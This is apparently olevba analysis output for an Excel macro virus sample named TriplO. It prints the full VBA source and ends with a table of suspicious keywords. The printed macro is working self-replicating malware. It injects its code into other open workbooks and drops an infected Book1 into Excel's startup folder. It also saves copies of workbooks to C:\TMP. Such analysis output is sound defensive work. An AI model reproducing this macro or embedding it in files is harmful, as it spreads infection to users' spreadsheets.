olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'OOO
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
    If UCase(ThisWorkbook.Name) = "BOOK1" Then
        Application.Dialogs(xlDialogSaveAs).Show
        'Cancel = True
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set w1 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set w2 = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If w2.Lines(1, 1) <> "'OOO" Then
        w2.InsertLines 1, w1.Lines(1, w1.CountOfLines)
    End If
    
    If UCase(Dir(Application.StartupPath + "\book1.")) <> "BOOK1" Then
            Set xlApp = CreateObject("Excel.Application")
            Set xlWB = xlApp.Workbooks.Add
            Set xlWS = xlWB.Sheets.Add
            Set xlCM = xlWB.VBProject.VBComponents("ThisWorkbook").CodeModule
            xlCM.InsertLines 1, w1.Lines(1, w1.CountOfLines)
            xlWB.SaveAs Filename:=Application.StartupPath + "\Book1.", FileFormat:=xlNormal, AddToMru:=False
            xlWB.Close
            xlApp.Quit
        End If
End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    TmpDir = "C:\TMP\"
    If Trim(Dir(TmpDir)) = "" Then
        MkDir TmpDir
    End If
    oldname = ThisWorkbook.Name
    mFileName = "C:\TMP\" + oldname
    ThisWorkbook.SaveCopyAs Filename:=mFileName
End Sub

Private Sub Workbook_Open()
    Application.OnKey "{F5}", "ThisWorkbook.vtHideRow"
    Application.OnKey "{F6}", "ThisWorkbook.vtShowRow"
    Application.OnKey "{F7}", "ThisWorkbook.vtHideCol"
    Application.OnKey "{F8}", "ThisWorkbook.vtShowCol"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.TriplO.a-6eae4a7221a37147828a00dac8eeca11a551837a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  24510
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  24410
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  24410
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  24510
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  24511
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  15630
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  16810
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

